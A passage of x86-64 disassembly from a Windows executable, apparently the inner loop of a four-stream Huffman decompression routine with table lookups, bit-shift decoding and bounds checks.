   1400042f2:	48 81 c4 b8 00 00 00 	add    $0xb8,%rsp
   1400042f9:	5b                   	pop    %rbx
   1400042fa:	5e                   	pop    %rsi
   1400042fb:	5f                   	pop    %rdi
   1400042fc:	5d                   	pop    %rbp
   1400042fd:	41 5c                	pop    %r12
   1400042ff:	41 5d                	pop    %r13
   140004301:	41 5e                	pop    %r14
   140004303:	41 5f                	pop    %r15
   140004305:	c3                   	ret
   140004306:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000430d:	00 00 00 
   140004310:	48 85 ff             	test   %rdi,%rdi
   140004313:	0f 84 87 07 00 00    	je     0x140004aa0
   140004319:	4d 8d 78 06          	lea    0x6(%r8),%r15
   14000431d:	41 0f b6 54 3f ff    	movzbl -0x1(%r15,%rdi,1),%edx
   140004323:	48 83 ff 07          	cmp    $0x7,%rdi
   140004327:	0f 86 e3 06 00 00    	jbe    0x140004a10
   14000432d:	49 8d 74 3f f8       	lea    -0x8(%r15,%rdi,1),%rsi
   140004332:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004337:	84 d2                	test   %dl,%dl
   140004339:	0f 84 29 08 00 00    	je     0x140004b68
   14000433f:	44 0f bd ca          	bsr    %edx,%r9d
   140004343:	48 8b 36             	mov    (%rsi),%rsi
   140004346:	ba 08 00 00 00       	mov    $0x8,%edx
   14000434b:	44 29 ca             	sub    %r9d,%edx
   14000434e:	48 85 ed             	test   %rbp,%rbp
   140004351:	0f 84 49 07 00 00    	je     0x140004aa0
   140004357:	4c 01 ff             	add    %r15,%rdi
   14000435a:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000435f:	44 0f b6 4c 2f ff    	movzbl -0x1(%rdi,%rbp,1),%r9d
   140004365:	48 83 fd 07          	cmp    $0x7,%rbp
   140004369:	0f 86 41 07 00 00    	jbe    0x140004ab0
   14000436f:	48 8d 7c 2f f8       	lea    -0x8(%rdi,%rbp,1),%rdi
   140004374:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   140004379:	45 84 c9             	test   %r9b,%r9b
   14000437c:	0f 84 e6 07 00 00    	je     0x140004b68
   140004382:	45 0f bd c9          	bsr    %r9d,%r9d
   140004386:	41 bd 08 00 00 00    	mov    $0x8,%r13d
   14000438c:	48 8b 3f             	mov    (%rdi),%rdi
   14000438f:	45 29 cd             	sub    %r9d,%r13d
   140004392:	4d 85 db             	test   %r11,%r11
   140004395:	0f 84 05 07 00 00    	je     0x140004aa0
   14000439b:	4c 8b 74 24 20       	mov    0x20(%rsp),%r14
   1400043a0:	49 01 ee             	add    %rbp,%r14
   1400043a3:	4c 89 74 24 38       	mov    %r14,0x38(%rsp)
   1400043a8:	47 0f b6 4c 1e ff    	movzbl -0x1(%r14,%r11,1),%r9d
   1400043ae:	49 83 fb 07          	cmp    $0x7,%r11
   1400043b2:	0f 86 c0 07 00 00    	jbe    0x140004b78
   1400043b8:	4b 8d 5c 1e f8       	lea    -0x8(%r14,%r11,1),%rbx
   1400043bd:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1400043c2:	45 84 c9             	test   %r9b,%r9b
   1400043c5:	0f 84 9d 07 00 00    	je     0x140004b68
   1400043cb:	48 8b 1b             	mov    (%rbx),%rbx
   1400043ce:	45 0f bd c9          	bsr    %r9d,%r9d
   1400043d2:	48 89 1c 24          	mov    %rbx,(%rsp)
   1400043d6:	bb 08 00 00 00       	mov    $0x8,%ebx
   1400043db:	44 29 cb             	sub    %r9d,%ebx
   1400043de:	41 89 dc             	mov    %ebx,%r12d
   1400043e1:	48 85 c9             	test   %rcx,%rcx
   1400043e4:	0f 84 b6 06 00 00    	je     0x140004aa0
   1400043ea:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1400043ef:	4c 01 db             	add    %r11,%rbx
   1400043f2:	4c 8d 5b 08          	lea    0x8(%rbx),%r11
   1400043f6:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   1400043fb:	46 0f b6 4c 13 f9    	movzbl -0x7(%rbx,%r10,1),%r9d
   140004401:	4c 89 5c 24 70       	mov    %r11,0x70(%rsp)
   140004406:	48 83 f9 07          	cmp    $0x7,%rcx
   14000440a:	0f 86 20 08 00 00    	jbe    0x140004c30
   140004410:	45 84 c9             	test   %r9b,%r9b
   140004413:	0f 84 4f 07 00 00    	je     0x140004b68
   140004419:	45 0f bd c9          	bsr    %r9d,%r9d
   14000441d:	41 bb 08 00 00 00    	mov    $0x8,%r11d
   140004423:	45 29 cb             	sub    %r9d,%r11d
   140004426:	45 89 de             	mov    %r11d,%r14d
   140004429:	48 83 f9 88          	cmp    $0xffffffffffffff88,%rcx
   14000442d:	0f 87 bc fe ff ff    	ja     0x1400042ef
   140004433:	4a 8d 5c 13 f2       	lea    -0xe(%rbx,%r10,1),%rbx
   140004438:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   14000443d:	48 8b 2b             	mov    (%rbx),%rbp
   140004440:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   140004447:	00 
   140004448:	48 8b 9c 24 08 01 00 	mov    0x108(%rsp),%rbx
   14000444f:	00 
   140004450:	4c 8d 59 04          	lea    0x4(%rcx),%r11
   140004454:	48 8b 8c 24 08 01 00 	mov    0x108(%rsp),%rcx
   14000445b:	00 
   14000445c:	48 01 c3             	add    %rax,%rbx
   14000445f:	48 89 9c 24 a8 00 00 	mov    %rbx,0xa8(%rsp)
   140004466:	00 
   140004467:	48 83 eb 07          	sub    $0x7,%rbx
   14000446b:	48 83 c1 03          	add    $0x3,%rcx
   14000446f:	48 89 9c 24 80 00 00 	mov    %rbx,0x80(%rsp)
   140004476:	00 
   140004477:	48 c1 e9 02          	shr    $0x2,%rcx
   14000447b:	4c 8d 14 08          	lea    (%rax,%rcx,1),%r10
   14000447f:	4c 89 94 24 98 00 00 	mov    %r10,0x98(%rsp)
   140004486:	00 
   140004487:	49 01 ca             	add    %rcx,%r10
   14000448a:	4c 01 d1             	add    %r10,%rcx
   14000448d:	4c 89 94 24 90 00 00 	mov    %r10,0x90(%rsp)
   140004494:	00 
   140004495:	4c 8b 94 24 20 01 00 	mov    0x120(%rsp),%r10
   14000449c:	00 
   14000449d:	48 89 8c 24 a0 00 00 	mov    %rcx,0xa0(%rsp)
   1400044a4:	00 
   1400044a5:	49 89 c9             	mov    %rcx,%r9
   1400044a8:	45 0f b6 52 02       	movzbl 0x2(%r10),%r10d
   1400044ad:	44 89 54 24 7c       	mov    %r10d,0x7c(%rsp)
   1400044b2:	4d 8d 50 0e          	lea    0xe(%r8),%r10
   1400044b6:	4c 89 54 24 48       	mov    %r10,0x48(%rsp)
   1400044bb:	4c 8b 54 24 20       	mov    0x20(%rsp),%r10
   1400044c0:	49 83 c2 08          	add    $0x8,%r10
   1400044c4:	4c 89 54 24 50       	mov    %r10,0x50(%rsp)
   1400044c9:	4c 8b 54 24 38       	mov    0x38(%rsp),%r10
   1400044ce:	49 83 c2 08          	add    $0x8,%r10
   1400044d2:	4c 89 54 24 58       	mov    %r10,0x58(%rsp)
   1400044d7:	48 39 d9             	cmp    %rbx,%rcx
   1400044da:	0f 83 b3 13 00 00    	jae    0x140005893
   1400044e0:	8b 5c 24 7c          	mov    0x7c(%rsp),%ebx
   1400044e4:	4c 8b 94 24 90 00 00 	mov    0x90(%rsp),%r10
   1400044eb:	00 
   1400044ec:	48 89 7c 24 08       	mov    %rdi,0x8(%rsp)
   1400044f1:	4c 8b 84 24 98 00 00 	mov    0x98(%rsp),%r8
   1400044f8:	00 
   1400044f9:	4c 89 bc 24 88 00 00 	mov    %r15,0x88(%rsp)
   140004500:	00 
   140004501:	49 89 f7             	mov    %rsi,%r15
   140004504:	f7 db                	neg    %ebx
   140004506:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000450b:	4c 89 d5             	mov    %r10,%rbp
   14000450e:	49 89 c2             	mov    %rax,%r10
   140004511:	83 e3 3f             	and    $0x3f,%ebx
   140004514:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000451b:	00 00 00 00 
   14000451f:	90                   	nop
   140004520:	89 d1                	mov    %edx,%ecx
   140004522:	4c 89 f8             	mov    %r15,%rax
   140004525:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   14000452a:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   14000452f:	48 d3 e0             	shl    %cl,%rax
   140004532:	89 d9                	mov    %ebx,%ecx
   140004534:	48 d3 e8             	shr    %cl,%rax
   140004537:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   14000453b:	0f b7 08             	movzwl (%rax),%ecx
   14000453e:	66 41 89 0a          	mov    %cx,(%r10)
   140004542:	0f b6 48 02          	movzbl 0x2(%rax),%ecx
   140004546:	0f b6 40 03          	movzbl 0x3(%rax),%eax
   14000454a:	01 ca                	add    %ecx,%edx
   14000454c:	44 89 e9             	mov    %r13d,%ecx
   14000454f:	49 01 c2             	add    %rax,%r10
   140004552:	48 89 f8             	mov    %rdi,%rax
   140004555:	48 d3 e0             	shl    %cl,%rax
   140004558:	89 d9                	mov    %ebx,%ecx
   14000455a:	48 d3 e8             	shr    %cl,%rax
   14000455d:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   140004561:	0f b7 08             	movzwl (%rax),%ecx
   140004564:	66 41 89 08          	mov    %cx,(%r8)
   140004568:	0f b6 48 02          	movzbl 0x2(%rax),%ecx
   14000456c:	0f b6 40 03          	movzbl 0x3(%rax),%eax
   140004570:	41 01 cd             	add    %ecx,%r13d
   140004573:	44 89 e1             	mov    %r12d,%ecx
   140004576:	49 01 c0             	add    %rax,%r8
   140004579:	48 8b 04 24          	mov    (%rsp),%rax
   14000457d:	48 d3 e0             	shl    %cl,%rax
   140004580:	89 d9                	mov    %ebx,%ecx
   140004582:	48 d3 e8             	shr    %cl,%rax
   140004585:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   140004589:	0f b7 08             	movzwl (%rax),%ecx
   14000458c:	66 89 4d 00          	mov    %cx,0x0(%rbp)
   140004590:	0f b6 48 02          	movzbl 0x2(%rax),%ecx
   140004594:	0f b6 40 03          	movzbl 0x3(%rax),%eax
   140004598:	41 01 cc             	add    %ecx,%r12d
   14000459b:	44 89 f1             	mov    %r14d,%ecx
   14000459e:	48 d3 e6             	shl    %cl,%rsi
   1400045a1:	89 d9                	mov    %ebx,%ecx
   1400045a3:	48 01 e8             	add    %rbp,%rax
   1400045a6:	4c 89 fd             	mov    %r15,%rbp
   1400045a9:	48 d3 ee             	shr    %cl,%rsi
   1400045ac:	49 8d 0c b3          	lea    (%r11,%rsi,4),%rcx
   1400045b0:	0f b7 31             	movzwl (%rcx),%esi
   1400045b3:	66 41 89 31          	mov    %si,(%r9)
   1400045b7:	0f b6 71 02          	movzbl 0x2(%rcx),%esi
   1400045bb:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   1400045bf:	41 01 f6             	add    %esi,%r14d
   1400045c2:	49 01 c9             	add    %rcx,%r9
   1400045c5:	89 d1                	mov    %edx,%ecx
   1400045c7:	48 d3 e5             	shl    %cl,%rbp
   1400045ca:	89 d9                	mov    %ebx,%ecx
   1400045cc:	48 89 ee             	mov    %rbp,%rsi
   1400045cf:	48 d3 ee             	shr    %cl,%rsi
   1400045d2:	49 8d 0c b3          	lea    (%r11,%rsi,4),%rcx
   1400045d6:	0f b7 31             	movzwl (%rcx),%esi
   1400045d9:	66 41 89 32          	mov    %si,(%r10)
   1400045dd:	0f b6 69 02          	movzbl 0x2(%rcx),%ebp
   1400045e1:	01 d5                	add    %edx,%ebp
   1400045e3:	0f b6 51 03          	movzbl 0x3(%rcx),%edx
   1400045e7:	44 89 e9             	mov    %r13d,%ecx
   1400045ea:	49 01 d2             	add    %rdx,%r10
   1400045ed:	48 89 fa             	mov    %rdi,%rdx
   1400045f0:	48 d3 e2             	shl    %cl,%rdx
   1400045f3:	89 d9                	mov    %ebx,%ecx
   1400045f5:	48 d3 ea             	shr    %cl,%rdx
   1400045f8:	49 8d 14 93          	lea    (%r11,%rdx,4),%rdx
   1400045fc:	0f b7 0a             	movzwl (%rdx),%ecx
   1400045ff:	66 41 89 08          	mov    %cx,(%r8)
   140004603:	0f b6 7a 02          	movzbl 0x2(%rdx),%edi
   140004607:	44 89 e1             	mov    %r12d,%ecx
   14000460a:	0f b6 52 03          	movzbl 0x3(%rdx),%edx
   14000460e:	44 01 ef             	add    %r13d,%edi
   140004611:	49 01 d0             	add    %rdx,%r8
   140004614:	48 8b 14 24          	mov    (%rsp),%rdx
   140004618:	48 d3 e2             	shl    %cl,%rdx
   14000461b:	89 d9                	mov    %ebx,%ecx
   14000461d:	48 d3 ea             	shr    %cl,%rdx
   140004620:	49 8d 14 93          	lea    (%r11,%rdx,4),%rdx
   140004624:	0f b7 0a             	movzwl (%rdx),%ecx
   140004627:	66 89 08             	mov    %cx,(%rax)
   14000462a:	0f b6 72 02          	movzbl 0x2(%rdx),%esi
   14000462e:	44 89 f1             	mov    %r14d,%ecx
   140004631:	0f b6 52 03          	movzbl 0x3(%rdx),%edx
   140004635:	44 01 e6             	add    %r12d,%esi
   140004638:	4d 89 fc             	mov    %r15,%r12
   14000463b:	48 01 d0             	add    %rdx,%rax
   14000463e:	48 8b 54 24 10       	mov    0x10(%rsp),%rdx
   140004643:	48 d3 e2             	shl    %cl,%rdx
   140004646:	89 d9                	mov    %ebx,%ecx
   140004648:	48 d3 ea             	shr    %cl,%rdx
   14000464b:	49 8d 0c 93          	lea    (%r11,%rdx,4),%rcx
   14000464f:	0f b7 11             	movzwl (%rcx),%edx
   140004652:	66 41 89 11          	mov    %dx,(%r9)
   140004656:	0f b6 51 02          	movzbl 0x2(%rcx),%edx
   14000465a:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   14000465e:	44 01 f2             	add    %r14d,%edx
   140004661:	4c 8b 74 24 08       	mov    0x8(%rsp),%r14
   140004666:	49 01 c9             	add    %rcx,%r9
   140004669:	89 e9                	mov    %ebp,%ecx
   14000466b:	49 d3 e4             	shl    %cl,%r12
   14000466e:	89 d9                	mov    %ebx,%ecx
   140004670:	49 d3 ec             	shr    %cl,%r12
   140004673:	4b 8d 0c a3          	lea    (%r11,%r12,4),%rcx
   140004677:	44 0f b7 21          	movzwl (%rcx),%r12d
   14000467b:	66 45 89 22          	mov    %r12w,(%r10)
   14000467f:	44 0f b6 69 02       	movzbl 0x2(%rcx),%r13d
   140004684:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140004688:	41 01 ed             	add    %ebp,%r13d
   14000468b:	4c 89 f5             	mov    %r14,%rbp
   14000468e:	49 01 ca             	add    %rcx,%r10
   140004691:	89 f9                	mov    %edi,%ecx
   140004693:	48 d3 e5             	shl    %cl,%rbp
   140004696:	89 d9                	mov    %ebx,%ecx
   140004698:	48 d3 ed             	shr    %cl,%rbp
   14000469b:	49 8d 0c ab          	lea    (%r11,%rbp,4),%rcx
   14000469f:	0f b7 29             	movzwl (%rcx),%ebp
   1400046a2:	66 41 89 28          	mov    %bp,(%r8)
   1400046a6:	44 0f b6 61 02       	movzbl 0x2(%rcx),%r12d
   1400046ab:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   1400046af:	41 01 fc             	add    %edi,%r12d
   1400046b2:	48 8b 3c 24          	mov    (%rsp),%rdi
   1400046b6:	49 01 c8             	add    %rcx,%r8
   1400046b9:	89 f1                	mov    %esi,%ecx
   1400046bb:	48 d3 e7             	shl    %cl,%rdi
   1400046be:	89 d9                	mov    %ebx,%ecx
   1400046c0:	48 d3 ef             	shr    %cl,%rdi
   1400046c3:	49 8d 0c bb          	lea    (%r11,%rdi,4),%rcx
   1400046c7:	0f b7 39             	movzwl (%rcx),%edi
   1400046ca:	66 89 38             	mov    %di,(%rax)
   1400046cd:	0f b6 69 02          	movzbl 0x2(%rcx),%ebp
   1400046d1:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   1400046d5:	01 f5                	add    %esi,%ebp
   1400046d7:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
   1400046dc:	48 01 c8             	add    %rcx,%rax
   1400046df:	89 d1                	mov    %edx,%ecx
   1400046e1:	48 d3 e6             	shl    %cl,%rsi
   1400046e4:	89 d9                	mov    %ebx,%ecx
   1400046e6:	48 d3 ee             	shr    %cl,%rsi
   1400046e9:	49 8d 0c b3          	lea    (%r11,%rsi,4),%rcx
   1400046ed:	0f b7 31             	movzwl (%rcx),%esi
   1400046f0:	66 41 89 31          	mov    %si,(%r9)
   1400046f4:	0f b6 79 02          	movzbl 0x2(%rcx),%edi
   1400046f8:	0f b6 71 03          	movzbl 0x3(%rcx),%esi
   1400046fc:	44 89 e9             	mov    %r13d,%ecx
   1400046ff:	01 d7                	add    %edx,%edi
   140004701:	4c 89 fa             	mov    %r15,%rdx
   140004704:	48 d3 e2             	shl    %cl,%rdx
   140004707:	89 d9                	mov    %ebx,%ecx
   140004709:	4c 01 ce             	add    %r9,%rsi
   14000470c:	48 d3 ea             	shr    %cl,%rdx
   14000470f:	49 8d 0c 93          	lea    (%r11,%rdx,4),%rcx
   140004713:	0f b7 11             	movzwl (%rcx),%edx
   140004716:	66 41 89 12          	mov    %dx,(%r10)
   14000471a:	0f b6 51 02          	movzbl 0x2(%rcx),%edx
   14000471e:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140004722:	44 01 ea             	add    %r13d,%edx
   140004725:	49 01 ca             	add    %rcx,%r10
   140004728:	44 89 e1             	mov    %r12d,%ecx
   14000472b:	49 d3 e6             	shl    %cl,%r14
   14000472e:	89 d9                	mov    %ebx,%ecx
   140004730:	4d 89 f1             	mov    %r14,%r9
   140004733:	49 d3 e9             	shr    %cl,%r9
   140004736:	4b 8d 0c 8b          	lea    (%r11,%r9,4),%rcx
   14000473a:	44 0f b7 09          	movzwl (%rcx),%r9d
   14000473e:	66 45 89 08          	mov    %r9w,(%r8)
   140004742:	44 0f b6 69 02       	movzbl 0x2(%rcx),%r13d
   140004747:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   14000474b:	4c 8b 0c 24          	mov    (%rsp),%r9
   14000474f:	45 01 e5             	add    %r12d,%r13d
   140004752:	49 01 c8             	add    %rcx,%r8
   140004755:	89 e9                	mov    %ebp,%ecx
   140004757:	49 d3 e1             	shl    %cl,%r9
   14000475a:	89 d9                	mov    %ebx,%ecx
   14000475c:	49 d3 e9             	shr    %cl,%r9
   14000475f:	4b 8d 0c 8b          	lea    (%r11,%r9,4),%rcx
   140004763:	44 0f b7 09          	movzwl (%rcx),%r9d
   140004767:	66 44 89 08          	mov    %r9w,(%rax)
   14000476b:	44 0f b6 61 02       	movzbl 0x2(%rcx),%r12d
   140004770:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140004774:	41 01 ec             	add    %ebp,%r12d
   140004777:	48 8d 2c 08          	lea    (%rax,%rcx,1),%rbp
   14000477b:	48 8b 44 24 10       	mov    0x10(%rsp),%rax
   140004780:	89 f9                	mov    %edi,%ecx
   140004782:	48 d3 e0             	shl    %cl,%rax
   140004785:	89 d9                	mov    %ebx,%ecx
   140004787:	48 d3 e8             	shr    %cl,%rax
   14000478a:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   14000478e:	0f b7 08             	movzwl (%rax),%ecx
   140004791:	66 89 0e             	mov    %cx,(%rsi)
   140004794:	44 0f b6 48 03       	movzbl 0x3(%rax),%r9d
   140004799:	44 0f b6 70 02       	movzbl 0x2(%rax),%r14d
   14000479e:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1400047a3:	49 01 f1             	add    %rsi,%r9
   1400047a6:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   1400047ab:	41 01 fe             	add    %edi,%r14d
   1400047ae:	48 39 c6             	cmp    %rax,%rsi
   1400047b1:	0f 82 a9 00 00 00    	jb     0x140004860
   1400047b7:	89 d0                	mov    %edx,%eax
   1400047b9:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   1400047be:	83 e2 07             	and    $0x7,%edx
   1400047c1:	c1 e8 03             	shr    $0x3,%eax
   1400047c4:	48 29 c6             	sub    %rax,%rsi
   1400047c7:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400047cc:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400047d1:	4c 8b 3e             	mov    (%rsi),%r15
   1400047d4:	48 39 c7             	cmp    %rax,%rdi
   1400047d7:	0f 82 83 00 00 00    	jb     0x140004860
   1400047dd:	44 89 e8             	mov    %r13d,%eax
   1400047e0:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   1400047e5:	41 83 e5 07          	and    $0x7,%r13d
   1400047e9:	c1 e8 03             	shr    $0x3,%eax
   1400047ec:	48 29 c7             	sub    %rax,%rdi
   1400047ef:	48 8b 07             	mov    (%rdi),%rax
   1400047f2:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1400047f7:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
   1400047fc:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140004801:	48 39 c6             	cmp    %rax,%rsi
   140004804:	72 5a                	jb     0x140004860
   140004806:	44 89 e0             	mov    %r12d,%eax
   140004809:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   14000480e:	41 83 e4 07          	and    $0x7,%r12d
   140004812:	c1 e8 03             	shr    $0x3,%eax
   140004815:	48 29 c6             	sub    %rax,%rsi
   140004818:	48 8b 06             	mov    (%rsi),%rax
   14000481b:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140004820:	48 89 04 24          	mov    %rax,(%rsp)
   140004824:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140004829:	48 39 c7             	cmp    %rax,%rdi
   14000482c:	72 32                	jb     0x140004860
   14000482e:	44 89 f0             	mov    %r14d,%eax
   140004831:	41 83 e6 07          	and    $0x7,%r14d
   140004835:	c1 e8 03             	shr    $0x3,%eax
   140004838:	48 29 c7             	sub    %rax,%rdi
   14000483b:	48 8b 07             	mov    (%rdi),%rax
   14000483e:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   140004843:	48 89 44 24 10       	mov    %rax,0x10(%rsp)
   140004848:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000484f:	00 
   140004850:	49 39 c1             	cmp    %rax,%r9
   140004853:	0f 82 c7 fc ff ff    	jb     0x140004520
   140004859:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004860:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   140004865:	4c 89 fe             	mov    %r15,%rsi
   140004868:	4c 89 d0             	mov    %r10,%rax
   14000486b:	48 8b 7c 24 08       	mov    0x8(%rsp),%rdi
   140004870:	49 89 ea             	mov    %rbp,%r10
   140004873:	4c 8b bc 24 88 00 00 	mov    0x88(%rsp),%r15
   14000487a:	00 
   14000487b:	48 8b 6c 24 10       	mov    0x10(%rsp),%rbp
   140004880:	4c 89 c3             	mov    %r8,%rbx
   140004883:	4c 8b 84 24 98 00 00 	mov    0x98(%rsp),%r8
   14000488a:	00 
   14000488b:	49 39 c0             	cmp    %rax,%r8
   14000488e:	0f 92 44 24 08       	setb   0x8(%rsp)
   140004893:	48 39 9c 24 90 00 00 	cmp    %rbx,0x90(%rsp)
   14000489a:	00 
   14000489b:	0f 92 c1             	setb   %cl
   14000489e:	0a 4c 24 08          	or     0x8(%rsp),%cl
   1400048a2:	0f 85 40 fa ff ff    	jne    0x1400042e8
   1400048a8:	4c 39 94 24 a0 00 00 	cmp    %r10,0xa0(%rsp)
   1400048af:	00 
   1400048b0:	0f 82 32 fa ff ff    	jb     0x1400042e8
   1400048b6:	49 8d 58 fe          	lea    -0x2(%r8),%rbx
   1400048ba:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400048bf:	83 fa 40             	cmp    $0x40,%edx
   1400048c2:	0f 87 22 04 00 00    	ja     0x140004cea
   1400048c8:	49 8d 58 f9          	lea    -0x7(%r8),%rbx
   1400048cc:	4c 89 4c 24 08       	mov    %r9,0x8(%rsp)
   1400048d1:	4c 8b 4c 24 18       	mov    0x18(%rsp),%r9
   1400048d6:	48 89 9c 24 88 00 00 	mov    %rbx,0x88(%rsp)
   1400048dd:	00 
   1400048de:	8b 5c 24 7c          	mov    0x7c(%rsp),%ebx
   1400048e2:	f7 db                	neg    %ebx
   1400048e4:	83 e3 3f             	and    $0x3f,%ebx
   1400048e7:	e9 ec 00 00 00       	jmp    0x1400049d8
   1400048ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400048f0:	4d 39 cf             	cmp    %r9,%r15
   1400048f3:	0f 84 57 0f 00 00    	je     0x140005850
   1400048f9:	89 d6                	mov    %edx,%esi
   1400048fb:	4c 89 c9             	mov    %r9,%rcx
   1400048fe:	c1 ee 03             	shr    $0x3,%esi
   140004901:	41 89 f0             	mov    %esi,%r8d
   140004904:	4c 29 c1             	sub    %r8,%rcx
   140004907:	4c 39 f9             	cmp    %r15,%rcx
   14000490a:	0f 82 48 0e 00 00    	jb     0x140005758
   140004910:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
   140004917:	00 
   140004918:	49 89 c9             	mov    %rcx,%r9
   14000491b:	4c 39 c0             	cmp    %r8,%rax
   14000491e:	41 0f 92 c0          	setb   %r8b
   140004922:	c1 e6 03             	shl    $0x3,%esi
   140004925:	29 f2                	sub    %esi,%edx
   140004927:	48 8b 31             	mov    (%rcx),%rsi
   14000492a:	45 84 c0             	test   %r8b,%r8b
   14000492d:	0f 84 ef 0f 00 00    	je     0x140005922
   140004933:	89 d1                	mov    %edx,%ecx
   140004935:	49 89 f0             	mov    %rsi,%r8
   140004938:	49 d3 e0             	shl    %cl,%r8
   14000493b:	89 d9                	mov    %ebx,%ecx
   14000493d:	49 d3 e8             	shr    %cl,%r8
   140004940:	4b 8d 0c 83          	lea    (%r11,%r8,4),%rcx
   140004944:	44 0f b7 01          	movzwl (%rcx),%r8d
   140004948:	66 44 89 00          	mov    %r8w,(%rax)
   14000494c:	44 0f b6 41 02       	movzbl 0x2(%rcx),%r8d
   140004951:	0f b6 49 03          	movzbl 0x3(%rcx),%ecx
   140004955:	44 01 c2             	add    %r8d,%edx
   140004958:	49 89 f0             	mov    %rsi,%r8
   14000495b:	48 01 c8             	add    %rcx,%rax
   14000495e:	89 d1                	mov    %edx,%ecx
   140004960:	49 d3 e0             	shl    %cl,%r8
   140004963:	89 d9                	mov    %ebx,%ecx
   140004965:	49 d3 e8             	shr    %cl,%r8
   140004968:	4b 8d 0c 83          	lea    (%r11,%r8,4),%rcx
   14000496c:	44 0f b7 01          	movzwl (%rcx),%r8d
   140004970:	66 44 89 00          	mov    %r8w,(%rax)
   140004974:	44 0f b6 41 02       	movzbl 0x2(%rcx),%r8d
   140004979:	41 01 d0             	add    %edx,%r8d
   14000497c:	0f b6 51 03          	movzbl 0x3(%rcx),%edx
   140004980:	44 89 c1             	mov    %r8d,%ecx
   140004983:	48 01 d0             	add    %rdx,%rax
   140004986:	48 89 f2             	mov    %rsi,%rdx
   140004989:	48 d3 e2             	shl    %cl,%rdx
   14000498c:	89 d9                	mov    %ebx,%ecx
   14000498e:	48 d3 ea             	shr    %cl,%rdx
   140004991:	49 8d 0c 93          	lea    (%r11,%rdx,4),%rcx
   140004995:	0f b7 11             	movzwl (%rcx),%edx
   140004998:	66 89 10             	mov    %dx,(%rax)
   14000499b:	0f b6 51 02          	movzbl 0x2(%rcx),%edx
   14000499f:	44 01 c2             	add    %r8d,%edx
   1400049a2:	44 0f b6 41 03       	movzbl 0x3(%rcx),%r8d
   1400049a7:	89 d1                	mov    %edx,%ecx
   1400049a9:	49 01 c0             	add    %rax,%r8
   1400049ac:	48 89 f0             	mov    %rsi,%rax
   1400049af:	48 d3 e0             	shl    %cl,%rax
   1400049b2:	89 d9                	mov    %ebx,%ecx
   1400049b4:	48 d3 e8             	shr    %cl,%rax
   1400049b7:	49 8d 04 83          	lea    (%r11,%rax,4),%rax
   1400049bb:	0f b7 08             	movzwl (%rax),%ecx
   1400049be:	66 41 89 08          	mov    %cx,(%r8)
   1400049c2:	0f b6 48 02          	movzbl 0x2(%rax),%ecx
   1400049c6:	0f b6 40 03          	movzbl 0x3(%rax),%eax
   1400049ca:	01 ca                	add    %ecx,%edx
   1400049cc:	4c 01 c0             	add    %r8,%rax
   1400049cf:	83 fa 40             	cmp    $0x40,%edx
   1400049d2:	0f 87 08 03 00 00    	ja     0x140004ce0
   1400049d8:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   1400049dd:	49 39 c9             	cmp    %rcx,%r9
   1400049e0:	0f 82 0a ff ff ff    	jb     0x1400048f0
   1400049e6:	89 d1                	mov    %edx,%ecx
   1400049e8:	83 e2 07             	and    $0x7,%edx
   1400049eb:	c1 e9 03             	shr    $0x3,%ecx
   1400049ee:	49 29 c9             	sub    %rcx,%r9
   1400049f1:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   1400049f8:	00 
   1400049f9:	49 8b 31             	mov    (%r9),%rsi
   1400049fc:	48 39 c8             	cmp    %rcx,%rax
   1400049ff:	41 0f 92 c0          	setb   %r8b
   140004a03:	e9 22 ff ff ff       	jmp    0x14000492a
   140004a08:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004a0f:	00 
   140004a10:	41 0f b6 70 06       	movzbl 0x6(%r8),%esi
   140004a15:	66 83 ff 07          	cmp    $0x7,%di
   140004a19:	77 5d                	ja     0x140004a78
   140004a1b:	4c 8d 35 9e d7 01 00 	lea    0x1d79e(%rip),%r14        # 0x1400221c0
